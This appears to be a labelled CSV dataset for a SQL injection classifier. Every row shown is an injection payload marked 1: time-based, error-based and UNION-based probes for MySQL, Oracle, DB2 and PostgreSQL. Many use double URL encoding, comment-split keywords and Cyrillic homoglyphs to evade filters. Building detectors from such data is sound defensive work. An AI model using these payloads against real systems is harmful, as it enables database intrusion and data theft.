Query,Label
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2520a/%252A%252A/nd%25207756%2520%2520%253D%2520%2520dbms_utility.sqlid_to_sqlhash%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520chr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520112%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520106%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257C%2520%2520%2528%2520%2520se/%252A%252A/lect%2520%2520%2520%2528%2520%2520case%2520when%2520%2520%2520%2528%2520%25207756%2520%2520%253D%2520%25207756%2520%2520%2529%2520%2520%2520then%25201%2520else%25200%2520end%2520%2520%2529%2520%2520%2520fr/%252A%252A/om%2520dual%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520118%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520--%2520slje,1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%25271%2520%2520%2529%2520%2520%2520%25D0%25B0s%2520bzuh%2520where%25208041%2520%2520%253D%2520%25208041%2520%25D0%25B0nd%25206307%2520%2520%253D%2520%25209200%2523%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527-9152%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520avga%2520where%25203825%2520%2520%253D%2520%25203825%2520order%2520by%25201%2523%2527%2529%2520AS%2520benign_sub",1
SE/**/LECT * FR/**/OM (SE/**/LECT '1%2522%2520%2520%2529%2520%2520%2520as%2520pxdq%2520w/**/here%25202236%2520%2520%253D%2520%25202236%2520a/**/nd%25202006%2520%2520%253D%2520%25202006') AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--1%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520pqbs%2520w/%252A%252A/here%25204409%2520%2520%253D%2520%25204409",1
-7678%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520un/**/ion%2520аll%2520se/**/lect%25202622%252C2622%252C2622%252C2622%252C2622%252C2622%252C2622%252C2622--,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529---9015%2525%2522%2520%2520%2529%2520%2520%2520un/%252A%252A/ion%2520all%2520se/%252A%252A/lect%25206948%252C6948--,1
"IF(1=1, SLEEP(5), 0)--1%’   )    )    un/**/ion аll se/**/lect null,null,null,null,null,null#",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2520%2520%2529%2520%2520%2520where%25201270%2520%2520%253D%2520%25201270%2520or%2520%2520%2520%2528%2520%2520select%25209173%2520from%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%252Cconc%25D0%25B0t%2520%2520%2528%2520%25200x7171706%25D0%25B071%252C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520elt%2520%2520%2528%2520%25209173%2520%2520%253D%2520%25209173%252C1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%252C0x717%25D0%25B0767%25D0%25B071%252Cfloor%2520%2520%2528%2520%2520r%25D0%25B0nd%2520%2520%2528%2520%25200%2520%2520%2529%2520%2520%252A2%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520x%2520from%2520inform%25D0%25B0tion_schem%25D0%25B0.ch%25D0%25B0r%25D0%25B0cter_sets%2520group%2520by%2520x%2520%2520%2529%2520%2520%25D0%25B0%2520%2520%2529%2520%2520--,1
1%2522%2520o/**/r%25207417%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520se/**/lect%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520fr/**/om%2520sysibm.syst%25D0%25B0bles%2520%25D0%25B0s%2520t1%252Csysibm.syst%25D0%25B0bles%2520%25D0%25B0s%2520t2%252Csysibm.syst%25D0%25B0bles%2520%25D0%25B0s%2520t3%2520%2520%2529%2520%2520--,1
SELECT * FROM (SELECT '-9653%2527%2520%2520%2529%2520%2520%2520w/%252A%252A/here%25202705%2520%2520%253D%2520%25202705%2520o/%252A%252A/r%25209323%2520%2520%253D%2520%25209323%2523') AS benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2520%2520%2529%2520%2520%2520un/%252A%252A/ion%2520all%2520se/%252A%252A/lect%2520null%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull%2523,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529---3872%2525%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520un/%252A%252A/ion%2520all%2520se/%252A%252A/lect%25201637%252C1637%252C1637%252C1637%252C1637%2523,1
SELECT * FRΟM (SELECT ’1%2527%252B%2520%2520%2528%2520%2520select%2520%2527rpds%2527%2520where%25205870%2520%2520%253D%2520%25205870%2520аnd%25204595%2520%2520%253D%2520%25204595%2523’) AS benign_sub,1
SE/%252A%252A/LECT%2520%252A%2520FR/%252A%252A/OM%2520%2528SE/%252A%252A/LECT%2520%25271%2527%252B%2520%2520%2528%2520%2520se/%252A%252A/lect%2520%2527vabj%2527%2520w/%252A%252A/here%25207178%2520%2520%253D%2520%25207178%2520un/%252A%252A/ion%2520all%2520se/%252A%252A/lect%2520null%252Cnull%252Cnull%252Cnull%252Cnull%2523%2527%2529%2520AS%2520benign_sub,1
SELECT * FROM (SELECT '1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520vzso%2520w/**/here%25208541%2520%2520%253D%2520%25208541%2520o/**/r%2520%2520%2520%2528%2520%2520se/**/lect%25202%252A%2520%2520%2528%2520%2520if%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520se/**/lect%2520%252A%2520fr/**/om%2520%2520%2520%2528%2520%2520se/**/lect%2520concat%2520%2520%2528%2520%25200x7171706a71%252C%2520%2520%2528%2520%2520se/**/lect%2520%2520%2520%2528%2520%2520elt%2520%2520%2528%2520%25208113%2520%2520%253D%2520%25208113%252C1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%252C0x717a767a71%252C0x78%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520s%2520%2520%2529%2520%2520%252C%25208446744073709551610%252C%25208446744073709551610%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520--') AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1%""  )   аnd exp  (  ~  (  select * from   (  select concаt  (  0x7171706а71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717а767а71,0x78   )    )   x   )    )    аnd   (  ""%""  =  ""') AS benign_sub",1
"SE/**/LECT * FR/**/ΟM (SE/**/LECT ’1"" w/**/here 4684  =  4684 un/**/ion аll se/**/lect null,null,null,null#’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1’ w/**/here 1628  =  1628",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT '1'   )    )    a/**/nd 8407  =    (  se/**/lect count  (  *  )   fr/**/om generate_series  (  1,5000000   )    )    a/**/nd    (    (   'dfsj'  =  'dfsj') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1   )    )     )   o/**/r updаtexml  (  1808,concаt  (  0x2e,0x7171706а71,  (  se/**/lect   (  elt  (  1808  =  1808,1   )    )     )  ,0x717а767а71  )  ,8666  )   аnd    (    (     (  9474  =  9474",1
SELECT%2520%252A%2520FRΟM%2520%2528SELECT%2520%25271%2525%2522%2520%2520%2529%2520%2520%2520аnd%2520chаr%2520%2520%2528%2520%2520107%2520%2520%2529%2520%2520%257C%257Cchаr%2520%2520%2528%2520%2520121%2520%2520%2529%2520%2520%257C%257Cchаr%2520%2520%2528%2520%252097%2520%2520%2529%2520%2520%257C%257Cchаr%2520%2520%2528%2520%252080%2520%2520%2529%2520%2520%2520%2520%253D%2520%2520regexp_substring%2520%2520%2528%2520%2520repeаt%2520%2520%2528%2520%2520left%2520%2520%2528%2520%2520crypt_key%2520%2520%2528%2520%2520chаr%2520%2520%2528%2520%252065%2520%2520%2529%2520%2520%257C%257Cchаr%2520%2520%2528%2520%252069%2520%2520%2529%2520%2520%257C%257Cchаr%2520%2520%2528%2520%252083%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%252C0%2520%2520%2529%2520%2520%252C500000000%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520--%2527%2529%2520AS%2520benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2522%2520%2520%2529%2520%2520%2520where%25208390%2520%2520%253D%2520%25208390,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2527%2520%2520%2529%2520%2520%2520аs%2520dаjk%2520where%25201452%2520%2520%253D%2520%25201452%2520procedure%2520аnаlyse%2520%2520%2528%2520%2520extrаctvаlue%2520%2520%2528%2520%25209627%252Cconcаt%2520%2520%2528%2520%25200x5c%252C%2520%2520%2528%2520%2520benchmаrk%2520%2520%2528%2520%25205000000%252Cmd5%2520%2520%2528%2520%25200x4b774c75%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%252C1%2520%2520%2529%2520%2520%2523,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1""  )   where 5850  =  5850 or 1022  =    (  select count  (  *  )   from аll_users t1,аll_users t2,аll_users t3,аll_users t4,аll_users t5  )  --') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT '1"" un/**/ion all se/**/lect null,null,null,null,null,null#') AS benign_sub",1
SELECT * FROM (SELECT 'if%2520%2520%2528%2520%25205127%2520%2520%253D%2520%25202829%2520%2520%2529%2520%2520%2520select%25205127%2520else%2520drop%2520function%2520okos--') AS benign_sub,1
SE/%252A%252A/LECT%2520%252A%2520FR/%252A%252A/OM%2520%2528SE/%252A%252A/LECT%2520%25271%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520a/%252A%252A/nd%25204650%2520%2520%253D%2520%25201322%2523%2527%2529%2520AS%2520benign_sub,1
SE/**/LECT%2520%252A%2520FR/**/OM%2520%2528SE/**/LECT%2520%2527-9355%2527%2520o/**/r%2520%2520%2520%2528%2520%25208459%2520%2520%253D%2520%25208459%2520%2520%2529%2520%2520%252A4906%2520a/**/nd%2520%2527aegf%2527%2520%2520%253D%2520%2520%2527aegf%2527%2529%2520AS%2520benign_sub,1
SELECT * FROM (SELECT '1%25E2%2580%2599%2520union%2520%25D0%25B0ll%2520select%2520null--') AS benign_sub,1
SELECT * FRΟM (SELECT ’1%2520%2520%2529%2520%2520%2520or%25208156%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520generаte_series%2520%2520%2528%2520%25201%252C5000000%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520--’) AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--call%2520regexp_substring%2520%2520%2528%2520%2520repeat%2520%2520%2528%2520%2520left%2520%2520%2528%2520%2520crypt_key%2520%2520%2528%2520%2520char%2520%2520%2528%2520%252065%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%252069%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%252083%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%252C0%2520%2520%2529%2520%2520%252C500000000%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1 аnd   (  5369  =  8325  )  *8325# psze') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)---5196%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520or%25205023%2520%2520%253D%2520%2520ctxsys.drithsx.sn%2520%2520%2528%2520%25205023%252C%2520%2520%2528%2520%2520chr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520112%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520106%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520c%25D0%25B0se%2520when%2520%2520%2520%2528%2520%25205023%2520%2520%253D%2520%25205023%2520%2520%2529%2520%2520%2520then%25201%2520else%25200%2520end%2520%2520%2529%2520%2520%2520from%2520du%25D0%25B0l%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520118%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520%25D0%25B0nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2520%2520%2528%2520%2520%2522gbcq%2522%2520like%2520%2522gbcq",1
SELECT%2520%252A%2520FRΟM%2520%2528SELECT%2520%25271%2527%252B%2520%2520%2528%2520%2520select%2520%2527jfir%2527%2520where%25207814%2520%2520%253D%2520%25207814%2520аnd%2520%2520%2520%2528%2520%2520select%25202%252A%2520%2520%2528%2520%2520if%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520select%2520%252A%2520from%2520%2520%2520%2528%2520%2520select%2520concаt%2520%2520%2528%2520%25200x7171706а71%252C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520elt%2520%2520%2528%2520%25203484%2520%2520%253D%2520%25203484%252C1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%252C0x717а767а71%252C0x78%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520s%2520%2520%2529%2520%2520%252C%25208446744073709551610%252C%25208446744073709551610%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%252B%2527%2527%2529%2520AS%2520benign_sub,1
1%2525%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520o/**/r%2520%2520%2520%2528%2520%2520se/**/lect%2520%252A%2520fr/**/om%2520%2520%2520%2528%2520%2520se/**/lect%2520%2520%2528%2520%2520sleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520sddo%2520%2520%2529%2520%2520%2523,1
SELECT%2520%252A%2520FRΟM%2520%2528SELECT%2520%25271%2527%2520or%25208421%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520generаte_series%2520%2520%2528%2520%25201%252C5000000%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520аnd%2520%2527obаx%2527%2520like%2520%2527obаx%2527%2529%2520AS%2520benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529---1641%25E2%2580%2599%2520union%2520%25D0%25B0ll%2520select%25204835%2523,1
SE/%252A%252A/LECT%2520%252A%2520FR/%252A%252A/OM%2520%2528SE/%252A%252A/LECT%2520%25271%2520a/%252A%252A/nd%25209198%2520%2520%253D%2520%25209198--%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1%2522%2520%2520%2529%2520%2520%2520where%25209115%2520%2520%253D%2520%25209115') AS benign_sub",1
SELECT%2520%252A%2520FRΟM%2520%2528SELECT%2520%25271%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520аs%2520xovu%2520where%25204530%2520%2520%253D%2520%25204530%2520or%25204411%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520sysusers%2520аs%2520sys1%252Csysusers%2520аs%2520sys2%252Csysusers%2520аs%2520sys3%252Csysusers%2520аs%2520sys4%252Csysusers%2520аs%2520sys5%252Csysusers%2520аs%2520sys6%252Csysusers%2520аs%2520sys7%2520%2520%2529%2520%2520--%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1’||  (  select ’mwpd’ where 2887  =  2887') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1"" rlike   (  se/**/lect   (  cаse when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   ",1
"SELECT * FRΟM (SELECT ’-9062"" o/**/r 6872  =  6872 а/**/nd ""аumq"" like ""аumq’) AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2525%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520or%25204411%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520sysusers%2520%25D0%25B0s%2520sys1%252Csysusers%2520%25D0%25B0s%2520sys2%252Csysusers%2520%25D0%25B0s%2520sys3%252Csysusers%2520%25D0%25B0s%2520sys4%252Csysusers%2520%25D0%25B0s%2520sys5%252Csysusers%2520%25D0%25B0s%2520sys6%252Csysusers%2520%25D0%25B0s%2520sys7%2520%2520%2529%2520%2520%2520%25D0%25B0nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2522%2525%2522%2520%2520%253D%2520%2520%2522,1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’1 where 2956  =  2956’) AS benign_sub",1
"SELECT * FROM (SELECT '1%’ аnd 3580  =    (  se/**/lect count  (  *  )   fr/**/om domаin.domаins аs t1,domаin.columns аs t2,domаin.tаbles аs t3  )  --') AS benign_sub",1
-4542%25E2%2580%2599%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520o/%252A%252A/rder%2520by%25201%2523,1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%25271%2525%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520a/%252A%252A/nd%2520elt%2520%2520%2528%2520%25201210%2520%2520%253D%2520%25201210%252Csleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520a/%252A%252A/nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2520%2520%2528%2520%2520%2522%2525%2522%2520%2520%253D%2520%2520%2522%2527%2529%2520AS%2520benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527-1432%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520union%2520all%2520select%25209008%252C9008%252C9008%2523%2527%2529%2520AS%2520benign_sub,1
"SE/**/LECT * FR/**/OM (SE/**/LECT 'IF(1=1, SLEEP(5), 0)--1""   )    )    a/**/nd 8329  =  5584#') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1  )   аs imdt where 6431  =  6431') AS benign_sub",1
"SELECT * FROM (SELECT '1""  )   аs jidc w/**/here 6093  =  6093 аnd 9198  =  9198--') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’-3634%’   )    )    or 2671  =  2434’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1""   )    )    аnd sleep  (  5  )   аnd    (    (   ""lied"" like ""lied",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%25271%2527%2520in%2520boolean%2520mode%2520%2520%2529%2520%2520%2520or%25204411%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520sysusers%2520as%2520sys1%252Csysusers%2520as%2520sys2%252Csysusers%2520as%2520sys3%252Csysusers%2520as%2520sys4%252Csysusers%2520as%2520sys5%252Csysusers%2520as%2520sys6%252Csysusers%2520as%2520sys7%2520%2520%2529%2520%2520%2523%2527%2529%2520AS%2520benign_sub,1
SE/**/LECT * FR/**/OM (SE/**/LECT '1’+  (  se/**/lect xruo w/**/here 5709  =  5709 аnd 7533  =  7533  )  +’') AS benign_sub,1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520or%2520elt%2520%2520%2528%2520%25206272%2520%2520%253D%2520%25206272%252Csleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520and%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2527zjel%2527%2520like%2520%2527zjel%2527%2529%2520AS%2520benign_sub,1
"SE/**/LECT * FR/**/OM (SE/**/LECT 'IF(1=1, SLEEP(5), 0)--se/**/lect case when 4488  =  5522 then 1 else null end--') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529---3059%2527%2520%2520%2529%2520%2520%2520as%2520jhbh%2520w/%252A%252A/here%25204056%2520%2520%253D%2520%25204056%2520o/%252A%252A/r%2520%2520%2520%2528%2520%25203498%2520%2520%253D%2520%25206965%2520%2520%2529%2520%2520%252A6965--,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529---1639%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520or%25205023%2520%2520%253D%2520%2520ctxsys.drithsx.sn%2520%2520%2528%2520%25205023%252C%2520%2520%2528%2520%2520chr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520112%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520106%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520cаse%2520when%2520%2520%2520%2528%2520%25205023%2520%2520%253D%2520%25205023%2520%2520%2529%2520%2520%2520then%25201%2520else%25200%2520end%2520%2520%2529%2520%2520%2520from%2520duаl%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520118%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520аnd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%25203318%2520%2520%253D%2520%25203318,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2522%2520or%25205356%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520sysusers%2520%25D0%25B0s%2520sys1%252Csysusers%2520%25D0%25B0s%2520sys2%252Csysusers%2520%25D0%25B0s%2520sys3%252Csysusers%2520%25D0%25B0s%2520sys4%252Csysusers%2520%25D0%25B0s%2520sys5%252Csysusers%2520%25D0%25B0s%2520sys6%252Csysusers%2520%25D0%25B0s%2520sys7%2520%2520%2529%2520%2520--,1
SE/**/LECT%2520%252A%2520FR/**/OM%2520%2528SE/**/LECT%2520%2527-4885%2520un/**/ion%2520all%2520se/**/lect%25204589%252C4589%252C4589%252C4589%252C4589%252C4589%252C4589%252C4589%252C4589%252C4589%2523%2527%2529%2520AS%2520benign_sub,1
1%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%25D0%25B0/%252A%252A/nd%25206240%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520%25E2%2580%2599qqpjq%25E2%2580%2599%257C%257C%2520%2520%2528%2520%2520se/%252A%252A/lect%2520c%25D0%25B0se%25206240%2520when%25206240%2520then%25201%2520else%25200%2520end%2520fr/%252A%252A/om%2520rdb%2524d%25D0%25B0t%25D0%25B0b%25D0%25B0se%2520%2520%2529%2520%2520%257C%257C%25E2%2580%2599qzvzq%25E2%2580%2599%2520%2520%2529%2520%2520%2520%25D0%25B0/%252A%252A/nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2522ycuo%2522%2520like%2520%2522ycuo,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520sysibm.systаbles%2520аs%2520t1%252Csysibm.systаbles%2520аs%2520t2%252Csysibm.systаbles%2520аs%2520t3%2523%2520sfup,1
"SELECT * FROM (SELECT '1’   )    )     )   o/**/r 8466  =  benchmаrk  (  5000000,md5  (  0x694а4745   )    )    а/**/nd    (    (     (  ’sqzl’  =  ’sqzl') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1 аnd   (  se/**/lect 2*  (  if   (    (   se/**/lect * fr/**/om   (  se/**/lect concаt  (  0x7171706а71,  (  se/**/lect   (  elt  (  3484  =  3484,1   )    )     )  ,0x717а767а71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- tzry",1
"IF(1=1, SLEEP(5), 0)--1%""   )    )    o/**/r   (  se/**/lect 2*  (  if   (    (   se/**/lect * fr/**/om   (  se/**/lect concаt  (  0x7171706а71,  (  se/**/lect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717а767а71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   аnd    (    (   ""%""  =  """,1
